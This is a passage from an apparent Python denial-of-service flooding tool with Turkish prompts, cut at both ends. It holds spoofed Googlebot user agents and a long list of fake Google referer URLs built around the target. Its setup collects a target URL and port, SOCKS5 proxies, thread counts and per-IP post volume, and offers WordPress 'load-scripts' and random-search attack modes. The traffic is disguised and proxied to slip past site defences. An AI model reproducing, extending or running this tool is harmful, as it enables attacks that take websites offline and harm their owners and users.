"Mozilla/5.0 (Linux; Android 7.1.2; Nexus 5X Build/N2G47F; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.132 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
"Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.96 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",]

def refererdex():
    dex=["http://google.com.af/url?q=%s"%(url),
"http://google.al/url?q=%s"%(url),
"http://google.dz/url?q=%s"%(url),
"http://google.as/url?q=%s"%(url),
"http://google.ad/url?q=%s"%(url),
"http://google.it.ao/url?q=%s"%(url),
"http://google.com.ai/url?q=%s"%(url),
"http://google.com.ag/url?q=%s"%(url),
"http://google.com.ar/url?q=%s"%(url),
"http://google.am/url?q=%s"%(url),
"http://google.ac/url?q=%s"%(url),
"http://google.com.au/url?q=%s"%(url),
"http://google.at/url?q=%s"%(url),
"http://google.az/url?q=%s"%(url),
"http://google.bs/url?q=%s"%(url),
"http://google.com.bh/url?q=%s"%(url),
"http://google.com.bd/url?q=%s"%(url),
"http://google.com.by/url?q=%s"%(url),
"http://google.be/url?q=%s"%(url),
"http://google.com.bz/url?q=%s"%(url),
"http://google.bj/url?q=%s"%(url),
"http://google.bt/url?q=%s"%(url),
"http://google.com.bo/url?q=%s"%(url),
"http://google.ba/url?q=%s"%(url),
"http://google.co.bw/url?q=%s"%(url),
"http://google.com.br/url?q=%s"%(url),
"http://google.vg/url?q=%s"%(url),
"http://google.com.bn/url?q=%s"%(url),
"http://google.bg/url?q=%s"%(url),
"http://google.bf/url?q=%s"%(url),
"http://google.bi/url?q=%s"%(url),
"http://google.com.kh/url?q=%s"%(url),
"http://google.cm/url?q=%s"%(url),
"http://google.ca/url?q=%s"%(url),
"http://google.cv/url?q=%s"%(url),
"http://google.cat/url?q=%s"%(url),
"http://google.cf/url?q=%s"%(url),
"http://google.td/url?q=%s"%(url),
"http://google.cl/url?q=%s"%(url),
"http://google.cn/url?q=%s"%(url),
"http://google.com.co/url?q=%s"%(url),
"http://google.cd/url?q=%s"%(url),
"http://google.cg/url?q=%s"%(url),
"http://google.co.ck/url?q=%s"%(url),
"http://google.co.cr/url?q=%s"%(url),
"http://google.ci/url?q=%s"%(url),
"http://google.hr/url?q=%s"%(url),
"http://google.com.cu/url?q=%s"%(url),
"http://google.com.cy/url?q=%s"%(url),
"http://google.cz/url?q=%s"%(url),
"http://google.dk/url?q=%s"%(url),
"http://google.dj/url?q=%s"%(url),
"http://google.dm/url?q=%s"%(url),
"http://google.com.do/url?q=%s"%(url),
"http://google.com.ec/url?q=%s"%(url),
"http://google.com.eg/url?q=%s"%(url),
"http://google.com.sv/url?q=%s"%(url),
"http://google.ee/url?q=%s"%(url),
"http://google.com.et/url?q=%s"%(url),
"http://google.com.fj/url?q=%s"%(url),
"http://google.fi/url?q=%s"%(url),
"http://google.fr/url?q=%s"%(url),
"http://google.ga/url?q=%s"%(url),
"http://google.gm/url?q=%s"%(url),
"http://google.ge/url?q=%s"%(url),
"http://google.de/url?q=%s"%(url),
"http://google.com.gh/url?q=%s"%(url),
"http://google.com.gi/url?q=%s"%(url),
"http://google.gr/url?q=%s"%(url),
"http://google.gl/url?q=%s"%(url),
"http://google.gp/url?q=%s"%(url),
"http://google.com.gt/url?q=%s"%(url),
"http://google.gg/url?q=%s"%(url),
"http://google.gy/url?q=%s"%(url),
"http://google.ht/url?q=%s"%(url),
"http://google.hn/url?q=%s"%(url),
"http://google.com.hk/url?q=%s"%(url),
"http://google.hu/url?q=%s"%(url),
"http://google.is/url?q=%s"%(url),
"http://google.co.in/url?q=%s"%(url),
"http://google.co.id/url?q=%s"%(url),
"http://google.iq/url?q=%s"%(url),
"http://google.ie/url?q=%s"%(url),
"http://google.co.im/url?q=%s"%(url),
"http://google.co.il/url?q=%s"%(url),
"http://google.it/url?q=%s"%(url),
"http://google.ci/url?q=%s"%(url),
"http://google.com.jm/url?q=%s"%(url),
"http://google.co.jp/url?q=%s"%(url),
"http://google.co.je/url?q=%s"%(url),
"http://google.jo/url?q=%s"%(url),
"http://google.kz/url?q=%s"%(url),
"http://google.co.ke/url?q=%s"%(url),
"http://google.ki/url?q=%s"%(url),
"http://google.com.kw/url?q=%s"%(url),
"http://google.com.kg/url?q=%s"%(url),
"http://google.la/url?q=%s"%(url),
"http://google.lv/url?q=%s"%(url),
"http://google.com.lb/url?q=%s"%(url),
"http://google.co.ls/url?q=%s"%(url),
"http://google.com.ly/url?q=%s"%(url),
"http://google.li/url?q=%s"%(url),
"http://google.lt/url?q=%s"%(url),
"http://google.lu/url?q=%s"%(url),
"http://google.mk/url?q=%s"%(url),
"http://google.mg/url?q=%s"%(url),
"http://google.mw/url?q=%s"%(url),
"http://google.com.my/url?q=%s"%(url),
"http://google.mv/url?q=%s"%(url),
"http://google.ml/url?q=%s"%(url),
"http://google.com.mt/url?q=%s"%(url),
"http://google.mu/url?q=%s"%(url),
"http://google.com.mx/url?q=%s"%(url),
"http://google.fm/url?q=%s"%(url),
"http://google.md/url?q=%s"%(url),
"http://google.mn/url?q=%s"%(url),
"http://google.me/url?q=%s"%(url),
"http://google.ms/url?q=%s"%(url),
"http://google.co.ma/url?q=%s"%(url),
"http://google.co.mz/url?q=%s"%(url),
"http://google.com.na/url?q=%s"%(url),
"http://google.nr/url?q=%s"%(url),
"http://google.com.np/url?q=%s"%(url),
"http://google.nl/url?q=%s"%(url),
"http://google.co.nz/url?q=%s"%(url),
"http://google.com.ni/url?q=%s"%(url),
"http://google.ne/url?q=%s"%(url),
"http://google.com.ng/url?q=%s"%(url),
"http://google.nu/url?q=%s"%(url),
"http://google.com.nf/url?q=%s"%(url),
"http://google.no/url?q=%s"%(url),
"http://google.com.om/url?q=%s"%(url),
"http://google.com.pk/url?q=%s"%(url),
"http://google.ps/url?q=%s"%(url),
"http://google.com.pa/url?q=%s"%(url),
"http://google.com.pg/url?q=%s"%(url),
"http://google.com.py/url?q=%s"%(url),
"http://google.com.pe/url?q=%s"%(url),
"http://google.com.ph/url?q=%s"%(url),
"http://google.pn/url?q=%s"%(url),
"http://google.pl/url?q=%s"%(url),
"http://google.pt/url?q=%s"%(url),
"http://google.com.pr/url?q=%s"%(url),
"http://google.com.qa/url?q=%s"%(url),
"http://google.ro/url?q=%s"%(url),
"http://google.ru/url?q=%s"%(url),
"http://google.rw/url?q=%s"%(url),
"http://google.sh/url?q=%s"%(url),
"http://google.ws/url?q=%s"%(url),
"http://google.sm/url?q=%s"%(url),
"http://google.st/url?q=%s"%(url),
"http://google.com.sa/url?q=%s"%(url),
"http://google.sn/url?q=%s"%(url),
"http://google.rs/url?q=%s"%(url),
"http://google.sc/url?q=%s"%(url),
"http://google.com.sl/url?q=%s"%(url),
"http://google.com.sg/url?q=%s"%(url),
"http://google.sk/url?q=%s"%(url),
"http://google.si/url?q=%s"%(url),
"http://google.com.sb/url?q=%s"%(url),
"http://google.so/url?q=%s"%(url),
"http://google.co.za/url?q=%s"%(url),
"http://google.co.kr/url?q=%s"%(url),
"http://google.es/url?q=%s"%(url),
"http://google.lk/url?q=%s"%(url),
"http://google.com.vc/url?q=%s"%(url),
"http://google.sr/url?q=%s"%(url),
"http://google.se/url?q=%s"%(url),
"http://google.ch/url?q=%s"%(url),
"http://google.com.tw/url?q=%s"%(url),
"http://google.com.tj/url?q=%s"%(url),
"http://google.co.tz/url?q=%s"%(url),
"http://google.co.th/url?q=%s"%(url),
"http://google.tl/url?q=%s"%(url),
"http://google.tg/url?q=%s"%(url),
"http://google.tk/url?q=%s"%(url),
"http://google.to/url?q=%s"%(url),
"http://google.tt/url?q=%s"%(url),
"http://google.tn/url?q=%s"%(url),
"http://google.com.tr/url?q=%s"%(url),
"http://google.tm/url?q=%s"%(url),
"http://google.co.ug/url?q=%s"%(url),
"http://google.com.ua/url?q=%s"%(url),
"http://google.ae/url?q=%s"%(url),
"http://google.co.uk/url?q=%s"%(url),
"http://google.com/url?q=%s"%(url),
"http://google.com.uy/url?q=%s"%(url),
"http://google.co.uz/url?q=%s"%(url),
"http://google.vu/url?q=%s"%(url),
"http://google.co.ve/url?q=%s"%(url),
"http://google.com.vn/url?q=%s"%(url),
"http://google.co.vi/url?q=%s"%(url),
"http://google.co.zm/url?q=%s"%(url),
"http://google.co.zw/url?q=%s"%(url),
"http://maps.google.com.af/url?q=%s"%(url),
"http://maps.google.al/url?q=%s"%(url),
"http://maps.google.dz/url?q=%s"%(url),
"http://maps.google.as/url?q=%s"%(url),
"http://maps.google.ad/url?q=%s"%(url),
"http://maps.google.it.ao/url?q=%s"%(url),
"http://maps.google.com.ai/url?q=%s"%(url),
"http://maps.google.com.ag/url?q=%s"%(url),
"http://maps.google.com.ar/url?q=%s"%(url),
"http://maps.google.am/url?q=%s"%(url),
"http://maps.google.ac/url?q=%s"%(url),
"http://maps.google.com.au/url?q=%s"%(url),
"http://maps.google.at/url?q=%s"%(url),
"http://maps.google.az/url?q=%s"%(url),
"http://maps.google.bs/url?q=%s"%(url),
"http://maps.google.com.bh/url?q=%s"%(url),
"http://maps.google.com.bd/url?q=%s"%(url),
"http://maps.google.com.by/url?q=%s"%(url),
"http://maps.google.be/url?q=%s"%(url),
"http://maps.google.com.bz/url?q=%s"%(url),
"http://maps.google.bj/url?q=%s"%(url),
"http://maps.google.bt/url?q=%s"%(url),
"http://maps.google.com.bo/url?q=%s"%(url),
"http://maps.google.ba/url?q=%s"%(url),
"http://maps.google.co.bw/url?q=%s"%(url),
"http://maps.google.com.br/url?q=%s"%(url),
"http://maps.google.vg/url?q=%s"%(url),
"http://maps.google.com.bn/url?q=%s"%(url),
"http://maps.google.bg/url?q=%s"%(url),
"http://maps.google.bf/url?q=%s"%(url),
"http://maps.google.bi/url?q=%s"%(url),
"http://maps.google.com.kh/url?q=%s"%(url),
"http://maps.google.cm/url?q=%s"%(url),
"http://maps.google.ca/url?q=%s"%(url),
"http://maps.google.cv/url?q=%s"%(url),
"http://maps.google.cat/url?q=%s"%(url),
"http://maps.google.cf/url?q=%s"%(url),
"http://maps.google.td/url?q=%s"%(url),
"http://maps.google.cl/url?q=%s"%(url),
"http://maps.google.cn/url?q=%s"%(url),
"http://maps.google.com.co/url?q=%s"%(url),
"http://maps.google.cd/url?q=%s"%(url),
"http://maps.google.cg/url?q=%s"%(url),
"http://maps.google.co.ck/url?q=%s"%(url),
"http://maps.google.co.cr/url?q=%s"%(url),
"http://maps.google.ci/url?q=%s"%(url),
"http://maps.google.hr/url?q=%s"%(url),
"http://maps.google.com.cu/url?q=%s"%(url),
"http://maps.google.com.cy/url?q=%s"%(url),
"http://maps.google.cz/url?q=%s"%(url),
"http://maps.google.dk/url?q=%s"%(url),
"http://maps.google.dj/url?q=%s"%(url),
"http://maps.google.dm/url?q=%s"%(url),
"http://maps.google.com.do/url?q=%s"%(url),
"http://maps.google.com.ec/url?q=%s"%(url),
"http://maps.google.com.eg/url?q=%s"%(url),
"http://maps.google.com.sv/url?q=%s"%(url),
"http://maps.google.ee/url?q=%s"%(url),
"http://maps.google.com.et/url?q=%s"%(url),
"http://maps.google.com.fj/url?q=%s"%(url),
"http://maps.google.fi/url?q=%s"%(url),
"http://maps.google.fr/url?q=%s"%(url),
"http://maps.google.ga/url?q=%s"%(url),
"http://maps.google.gm/url?q=%s"%(url),
"http://maps.google.ge/url?q=%s"%(url),
"http://maps.google.de/url?q=%s"%(url),
"http://maps.google.com.gh/url?q=%s"%(url),
"http://maps.google.com.gi/url?q=%s"%(url),
"http://maps.google.gr/url?q=%s"%(url),
"http://maps.google.gl/url?q=%s"%(url),
"http://maps.google.gp/url?q=%s"%(url),
"http://maps.google.com.gt/url?q=%s"%(url),
"http://maps.google.gg/url?q=%s"%(url),
"http://maps.google.gy/url?q=%s"%(url),
"http://maps.google.ht/url?q=%s"%(url),
"http://maps.google.hn/url?q=%s"%(url),
"http://maps.google.com.hk/url?q=%s"%(url),
"http://maps.google.hu/url?q=%s"%(url),
"http://maps.google.is/url?q=%s"%(url),
"http://maps.google.co.in/url?q=%s"%(url),
"http://maps.google.co.id/url?q=%s"%(url),
"http://maps.google.iq/url?q=%s"%(url),
"http://maps.google.ie/url?q=%s"%(url),
"http://maps.google.co.im/url?q=%s"%(url),
"http://maps.google.co.il/url?q=%s"%(url),
"http://maps.google.it/url?q=%s"%(url),
"http://maps.google.ci/url?q=%s"%(url),
"http://maps.google.com.jm/url?q=%s"%(url),
"http://maps.google.co.jp/url?q=%s"%(url),
"http://maps.google.co.je/url?q=%s"%(url),
"http://maps.google.jo/url?q=%s"%(url),
"http://maps.google.kz/url?q=%s"%(url),
"http://maps.google.co.ke/url?q=%s"%(url),
"http://maps.google.ki/url?q=%s"%(url),
"http://maps.google.com.kw/url?q=%s"%(url),
"http://maps.google.com.kg/url?q=%s"%(url),
"http://maps.google.la/url?q=%s"%(url),
"http://maps.google.lv/url?q=%s"%(url),
"http://maps.google.com.lb/url?q=%s"%(url),
"http://maps.google.co.ls/url?q=%s"%(url),
"http://maps.google.com.ly/url?q=%s"%(url),
"http://maps.google.li/url?q=%s"%(url),
"http://maps.google.lt/url?q=%s"%(url),
"http://maps.google.lu/url?q=%s"%(url),
"http://maps.google.mk/url?q=%s"%(url),
"http://maps.google.mg/url?q=%s"%(url),
"http://maps.google.mw/url?q=%s"%(url),
"http://maps.google.com.my/url?q=%s"%(url),
"http://maps.google.mv/url?q=%s"%(url),
"http://maps.google.ml/url?q=%s"%(url),
"http://maps.google.com.mt/url?q=%s"%(url),
"http://maps.google.mu/url?q=%s"%(url),
"http://maps.google.com.mx/url?q=%s"%(url),
"http://maps.google.fm/url?q=%s"%(url),
"http://maps.google.md/url?q=%s"%(url),
"http://maps.google.mn/url?q=%s"%(url),
"http://maps.google.me/url?q=%s"%(url),
"http://maps.google.ms/url?q=%s"%(url),
"http://maps.google.co.ma/url?q=%s"%(url),
"http://maps.google.co.mz/url?q=%s"%(url),
"http://maps.google.com.na/url?q=%s"%(url),
"http://maps.google.nr/url?q=%s"%(url),
"http://maps.google.com.np/url?q=%s"%(url),
"http://maps.google.nl/url?q=%s"%(url),
"http://maps.google.co.nz/url?q=%s"%(url),
"http://maps.google.com.ni/url?q=%s"%(url),
"http://maps.google.ne/url?q=%s"%(url),
"http://maps.google.com.ng/url?q=%s"%(url),
"http://maps.google.nu/url?q=%s"%(url),
"http://maps.google.com.nf/url?q=%s"%(url),
"http://maps.google.no/url?q=%s"%(url),
"http://maps.google.com.om/url?q=%s"%(url),
"http://maps.google.com.pk/url?q=%s"%(url),
"http://maps.google.ps/url?q=%s"%(url),
"http://maps.google.com.pa/url?q=%s"%(url),
"http://maps.google.com.pg/url?q=%s"%(url),
"http://maps.google.com.py/url?q=%s"%(url),
"http://maps.google.com.pe/url?q=%s"%(url),
"http://maps.google.com.ph/url?q=%s"%(url),
"http://maps.google.pn/url?q=%s"%(url),
"http://maps.google.pl/url?q=%s"%(url),
"http://maps.google.pt/url?q=%s"%(url),
"http://maps.google.com.pr/url?q=%s"%(url),
"http://maps.google.com.qa/url?q=%s"%(url),
"http://maps.google.ro/url?q=%s"%(url),
"http://maps.google.ru/url?q=%s"%(url),
"http://maps.google.rw/url?q=%s"%(url),
"http://maps.google.sh/url?q=%s"%(url),
"http://maps.google.ws/url?q=%s"%(url),
"http://maps.google.sm/url?q=%s"%(url),
"http://maps.google.st/url?q=%s"%(url),
"http://maps.google.com.sa/url?q=%s"%(url),
"http://maps.google.sn/url?q=%s"%(url),
"http://maps.google.rs/url?q=%s"%(url),
"http://maps.google.sc/url?q=%s"%(url),
"http://maps.google.com.sl/url?q=%s"%(url),
"http://maps.google.com.sg/url?q=%s"%(url),
"http://maps.google.sk/url?q=%s"%(url),
"http://maps.google.si/url?q=%s"%(url),
"http://maps.google.com.sb/url?q=%s"%(url),
"http://maps.google.so/url?q=%s"%(url),
"http://maps.google.co.za/url?q=%s"%(url),
"http://maps.google.co.kr/url?q=%s"%(url),
"http://maps.google.es/url?q=%s"%(url),
"http://maps.google.lk/url?q=%s"%(url),
"http://maps.google.com.vc/url?q=%s"%(url),
"http://maps.google.sr/url?q=%s"%(url),
"http://maps.google.se/url?q=%s"%(url),
"http://maps.google.ch/url?q=%s"%(url),
"http://maps.google.com.tw/url?q=%s"%(url),
"http://maps.google.com.tj/url?q=%s"%(url),
"http://maps.google.co.tz/url?q=%s"%(url),
"http://maps.google.co.th/url?q=%s"%(url),
"http://maps.google.tl/url?q=%s"%(url),
"http://maps.google.tg/url?q=%s"%(url),
"http://maps.google.tk/url?q=%s"%(url),
"http://maps.google.to/url?q=%s"%(url),
"http://maps.google.tt/url?q=%s"%(url),
"http://maps.google.tn/url?q=%s"%(url),
"http://maps.google.com.tr/url?q=%s"%(url),
"http://maps.google.tm/url?q=%s"%(url),
"http://maps.google.co.ug/url?q=%s"%(url),
"http://maps.google.com.ua/url?q=%s"%(url),
"http://maps.google.ae/url?q=%s"%(url),
"http://maps.google.co.uk/url?q=%s"%(url),
"http://maps.google.com/url?q=%s"%(url),
"http://maps.google.com.uy/url?q=%s"%(url),
"http://maps.google.co.uz/url?q=%s"%(url),
"http://maps.google.vu/url?q=%s"%(url),
"http://maps.google.co.ve/url?q=%s"%(url),
"http://maps.google.com.vn/url?q=%s"%(url),
"http://maps.google.co.vi/url?q=%s"%(url),
"http://maps.google.co.zm/url?q=%s"%(url),
"http://maps.google.co.zw/url?q=%s"%(url),
"http://images.google.com.af/url?q=%s"%(url),
"http://images.google.al/url?q=%s"%(url),
"http://images.google.dz/url?q=%s"%(url),
"http://images.google.as/url?q=%s"%(url),
"http://images.google.ad/url?q=%s"%(url),
"http://images.google.it.ao/url?q=%s"%(url),
"http://images.google.com.ai/url?q=%s"%(url),
"http://images.google.com.ag/url?q=%s"%(url),
"http://images.google.com.ar/url?q=%s"%(url),
"http://images.google.am/url?q=%s"%(url),
"http://images.google.ac/url?q=%s"%(url),
"http://images.google.com.au/url?q=%s"%(url),
"http://images.google.at/url?q=%s"%(url),
"http://images.google.az/url?q=%s"%(url),
"http://images.google.bs/url?q=%s"%(url),
"http://images.google.com.bh/url?q=%s"%(url),
"http://images.google.com.bd/url?q=%s"%(url),
"http://images.google.com.by/url?q=%s"%(url),
"http://images.google.be/url?q=%s"%(url),
"http://images.google.com.bz/url?q=%s"%(url),
"http://images.google.bj/url?q=%s"%(url),
"http://images.google.bt/url?q=%s"%(url),
"http://images.google.com.bo/url?q=%s"%(url),
"http://images.google.ba/url?q=%s"%(url),
"http://images.google.co.bw/url?q=%s"%(url),
"http://images.google.com.br/url?q=%s"%(url),
"http://images.google.vg/url?q=%s"%(url),
"http://images.google.com.bn/url?q=%s"%(url),
"http://images.google.bg/url?q=%s"%(url),
"http://images.google.bf/url?q=%s"%(url),
"http://images.google.bi/url?q=%s"%(url),
"http://images.google.com.kh/url?q=%s"%(url),
"http://images.google.cm/url?q=%s"%(url),
"http://images.google.ca/url?q=%s"%(url),
"http://images.google.cv/url?q=%s"%(url),
"http://images.google.cat/url?q=%s"%(url),
"http://images.google.cf/url?q=%s"%(url),
"http://images.google.td/url?q=%s"%(url),
"http://images.google.cl/url?q=%s"%(url),
"http://images.google.cn/url?q=%s"%(url),
"http://images.google.com.co/url?q=%s"%(url),
"http://images.google.cd/url?q=%s"%(url),
"http://images.google.cg/url?q=%s"%(url),
"http://images.google.co.ck/url?q=%s"%(url),
"http://images.google.co.cr/url?q=%s"%(url),
"http://images.google.ci/url?q=%s"%(url),
"http://images.google.hr/url?q=%s"%(url),
"http://images.google.com.cu/url?q=%s"%(url),
"http://images.google.com.cy/url?q=%s"%(url),
"http://images.google.cz/url?q=%s"%(url),
"http://images.google.dk/url?q=%s"%(url),
"http://images.google.dj/url?q=%s"%(url),
"http://images.google.dm/url?q=%s"%(url),
"http://images.google.com.do/url?q=%s"%(url),
"http://images.google.com.ec/url?q=%s"%(url),
"http://images.google.com.eg/url?q=%s"%(url),
"http://images.google.com.sv/url?q=%s"%(url),
"http://images.google.ee/url?q=%s"%(url),
"http://images.google.com.et/url?q=%s"%(url),
"http://images.google.com.fj/url?q=%s"%(url),
"http://images.google.fi/url?q=%s"%(url),
"http://images.google.fr/url?q=%s"%(url),
"http://images.google.ga/url?q=%s"%(url),
"http://images.google.gm/url?q=%s"%(url),
"http://images.google.ge/url?q=%s"%(url),
"http://images.google.de/url?q=%s"%(url),
"http://images.google.com.gh/url?q=%s"%(url),
"http://images.google.com.gi/url?q=%s"%(url),
"http://images.google.gr/url?q=%s"%(url),
"http://images.google.gl/url?q=%s"%(url),
"http://images.google.gp/url?q=%s"%(url),
"http://images.google.com.gt/url?q=%s"%(url),
"http://images.google.gg/url?q=%s"%(url),
"http://images.google.gy/url?q=%s"%(url),
"http://images.google.ht/url?q=%s"%(url),
"http://images.google.hn/url?q=%s"%(url),
"http://images.google.com.hk/url?q=%s"%(url),
"http://images.google.hu/url?q=%s"%(url),
"http://images.google.is/url?q=%s"%(url),
"http://images.google.co.in/url?q=%s"%(url),
"http://images.google.co.id/url?q=%s"%(url),
"http://images.google.iq/url?q=%s"%(url),
"http://images.google.ie/url?q=%s"%(url),
"http://images.google.co.im/url?q=%s"%(url),
"http://images.google.co.il/url?q=%s"%(url),
"http://images.google.it/url?q=%s"%(url),
"http://images.google.ci/url?q=%s"%(url),
"http://images.google.com.jm/url?q=%s"%(url),
"http://images.google.co.jp/url?q=%s"%(url),
"http://images.google.co.je/url?q=%s"%(url),
"http://images.google.jo/url?q=%s"%(url),
"http://images.google.kz/url?q=%s"%(url),
"http://images.google.co.ke/url?q=%s"%(url),
"http://images.google.ki/url?q=%s"%(url),
"http://images.google.com.kw/url?q=%s"%(url),
"http://images.google.com.kg/url?q=%s"%(url),
"http://images.google.la/url?q=%s"%(url),
"http://images.google.lv/url?q=%s"%(url),
"http://images.google.com.lb/url?q=%s"%(url),
"http://images.google.co.ls/url?q=%s"%(url),
"http://images.google.com.ly/url?q=%s"%(url),
"http://images.google.li/url?q=%s"%(url),
"http://images.google.lt/url?q=%s"%(url),
"http://images.google.lu/url?q=%s"%(url),
"http://images.google.mk/url?q=%s"%(url),
"http://images.google.mg/url?q=%s"%(url),
"http://images.google.mw/url?q=%s"%(url),
"http://images.google.com.my/url?q=%s"%(url),
"http://images.google.mv/url?q=%s"%(url),
"http://images.google.ml/url?q=%s"%(url),
"http://images.google.com.mt/url?q=%s"%(url),
"http://images.google.mu/url?q=%s"%(url),
"http://images.google.com.mx/url?q=%s"%(url),
"http://images.google.fm/url?q=%s"%(url),
"http://images.google.md/url?q=%s"%(url),
"http://images.google.mn/url?q=%s"%(url),
"http://images.google.me/url?q=%s"%(url),
"http://images.google.ms/url?q=%s"%(url),
"http://images.google.co.ma/url?q=%s"%(url),
"http://images.google.co.mz/url?q=%s"%(url),
"http://images.google.com.na/url?q=%s"%(url),
"http://images.google.nr/url?q=%s"%(url),
"http://images.google.com.np/url?q=%s"%(url),
"http://images.google.nl/url?q=%s"%(url),
"http://images.google.co.nz/url?q=%s"%(url),
"http://images.google.com.ni/url?q=%s"%(url),
"http://images.google.ne/url?q=%s"%(url),
"http://images.google.com.ng/url?q=%s"%(url),
"http://images.google.nu/url?q=%s"%(url),
"http://images.google.com.nf/url?q=%s"%(url),
"http://images.google.no/url?q=%s"%(url),
"http://images.google.com.om/url?q=%s"%(url),
"http://images.google.com.pk/url?q=%s"%(url),
"http://images.google.ps/url?q=%s"%(url),
"http://images.google.com.pa/url?q=%s"%(url),
"http://images.google.com.pg/url?q=%s"%(url),
"http://images.google.com.py/url?q=%s"%(url),
"http://images.google.com.pe/url?q=%s"%(url),
"http://images.google.com.ph/url?q=%s"%(url),
"http://images.google.pn/url?q=%s"%(url),
"http://images.google.pl/url?q=%s"%(url),
"http://images.google.pt/url?q=%s"%(url),
"http://images.google.com.pr/url?q=%s"%(url),
"http://images.google.com.qa/url?q=%s"%(url),
"http://images.google.ro/url?q=%s"%(url),
"http://images.google.ru/url?q=%s"%(url),
"http://images.google.rw/url?q=%s"%(url),
"http://images.google.sh/url?q=%s"%(url),
"http://images.google.ws/url?q=%s"%(url),
"http://images.google.sm/url?q=%s"%(url),
"http://images.google.st/url?q=%s"%(url),
"http://images.google.com.sa/url?q=%s"%(url),
"http://images.google.sn/url?q=%s"%(url),
"http://images.google.rs/url?q=%s"%(url),
"http://images.google.sc/url?q=%s"%(url),
"http://images.google.com.sl/url?q=%s"%(url),
"http://images.google.com.sg/url?q=%s"%(url),
"http://images.google.sk/url?q=%s"%(url),
"http://images.google.si/url?q=%s"%(url),
"http://images.google.com.sb/url?q=%s"%(url),
"http://images.google.so/url?q=%s"%(url),
"http://images.google.co.za/url?q=%s"%(url),
"http://images.google.co.kr/url?q=%s"%(url),
"http://images.google.es/url?q=%s"%(url),
"http://images.google.lk/url?q=%s"%(url),
"http://images.google.com.vc/url?q=%s"%(url),
"http://images.google.sr/url?q=%s"%(url),
"http://images.google.se/url?q=%s"%(url),
"http://images.google.ch/url?q=%s"%(url),
"http://images.google.com.tw/url?q=%s"%(url),
"http://images.google.com.tj/url?q=%s"%(url),
"http://images.google.co.tz/url?q=%s"%(url),
"http://images.google.co.th/url?q=%s"%(url),
"http://images.google.tl/url?q=%s"%(url),
"http://images.google.tg/url?q=%s"%(url),
"http://images.google.tk/url?q=%s"%(url),
"http://images.google.to/url?q=%s"%(url),
"http://images.google.tt/url?q=%s"%(url),
"http://images.google.tn/url?q=%s"%(url),
"http://images.google.com.tr/url?q=%s"%(url),
"http://images.google.tm/url?q=%s"%(url),
"http://images.google.co.ug/url?q=%s"%(url),
"http://images.google.com.ua/url?q=%s"%(url),
"http://images.google.ae/url?q=%s"%(url),
"http://images.google.co.uk/url?q=%s"%(url),
"http://images.google.com/url?q=%s"%(url),
"http://images.google.com.uy/url?q=%s"%(url),
"http://images.google.co.uz/url?q=%s"%(url),
"http://images.google.vu/url?q=%s"%(url),
"http://images.google.co.ve/url?q=%s"%(url),
"http://images.google.com.vn/url?q=%s"%(url),
"http://images.google.co.vi/url?q=%s"%(url),
"http://images.google.co.zm/url?q=%s"%(url),
"http://images.google.co.zw/url?q=%s"%(url),]
    dexx1=random.choice(dex)
    return dexx1
socks5proxy1=False
normalwpataksorr=False
googlewpataksorr=False
rndrastdizin1=False
threadnormalwploadd=False
threadnormalwprandommsearch=False
threadnormaldizinrandom=False
thread_sadeatak =False
threadgooglewprandom=False
threadgooglewpload=False
rrndrastdizinn=False
threadgoogledizinrandomm=False
threadgoogle_sadeatak=False
def sor():
    try:
        global url 
        global urlport
        global url2
        #global 
        url=input("Url giriniz. = ")
        if url=="":
            print("Url adresi girilmedi url adresi giriniz!.")
            sor()
        urlport=int(input("Port numarası giriniz. = "))
        if urlport =="":
            print ("Port numarası girilmedi varsayılan 80 portu seçildi")
            urlport =80
        url2=url.replace("http://","").replace("https://","").split("/")[0].split(":")[0]
        
        def sock5proxy():
            global socks5proxy1
            socks5proxy1=False
            sokd=input("Sock5 Proxy atak yapmak ister misiniz? E/H = ")
            sorum=sokd.upper()
            if (sorum!="H") and (sorum !="E"):
                print("Yanlış giriş yaptınız Tekrar deneyiniz!.")
                sock5proxy()
            elif sorum =="E":
                socks5proxy1=True
        sock5proxy()
        def proxylist():
            try:
                global kaynak
                kaynak=[]
                cdosya=input("Proxy dosya adını giriniz. = ")
                prxokuma=open(cdosya).readlines()
                for i in prxokuma:
                    x=i.replace("\n","").replace("\r","")
                    kaynak.append(x)
            except EnvironmentError as exc:
                if exc.errno==2:
                    print ("Dosya bulunamadı lütfen tekrar giriniz.")
                    proxylist()
        proxylist()
        def numthreads():
            try:
                global threads
                threads=int(input("Threads değerini giriniz. "))
            except ValueError:
                print("Sadece sayı giriniz \n")
                numthreads()
        numthreads()
        def gucc():
            global guc
            try:
                guc=int(input("ayni ip tek seferde kac post yollamak istersiniz = "))
            except ValueError:
                print("Tekrar deneyiniz Harf içermesin rakamlardan oluşsun.\n")
                gucc()
        gucc()
        def agentsor():
            global normalwpataksorr
            global googlewpataksorr
            normalwpataksorr=False
            googlewpataksorr=False
            normalmidegilmi=input("Normal agent için \"0\" , Google agent atak için \"1\" tuşlayınız. = ")
            if normalmidegilmi=="0":
                normalwpataksorr=True
            elif normalmidegilmi=="1":
                googlewpataksorr=True
            if normalmidegilmi!="0" and normalmidegilmi!="1":
                print(" Ya 0 yada 1 tuşlayınız.Tekrar deneyiniz")
                agentsor()
        agentsor()
        def normalwpataksor():
            global threadnormalwploadd
            global threadnormalwprandommsearch
            global rndrastdizin1 
            rndrastdizin1=False
            threadnormalwploadd=False
            threadnormalwprandommsearch=False
            nwpatak=input("Wordpress atak yapmak istiyor musunuz? (Y/N) giriniz= ").upper()
            if nwpatak=="Y":   
                def wpatakcesit1():
                    global threadnormalwploadd
                    global threadnormalwprandommsearch
                    wpatakcesit=int(input("Load-scripts atak için \"0\" - search random atak için \"1\" tuşlayınız = "))
                    if wpatakcesit==0:
                        threadnormalwploadd=True
                    if wpatakcesit==1:
                        threadnormalwprandommsearch=True
                    if wpatakcesit !=0 and wpatakcesit !=1:
                        print ("Ya \"0\" yada \"1\" giriniz. tekrar deneyiniz")
                        wpatakcesit1()
                wpatakcesit1()
            if nwpatak=="N":
                rndrastdizin1=True
            if nwpatak !="N" and nwpatak !="Y":
                print ("Yanlis giris yaptiniz tekrar deneyin")
                normalwpataksor()
        if normalwpataksorr==True:
            normalwpataksor()
        def rndrastdizin():
            global normaldizinrandom 
            global thread_sadeatak 
            global threadnormaldizinrandom
            threadnormaldizinrandom=False
            thread_sadeatak =False
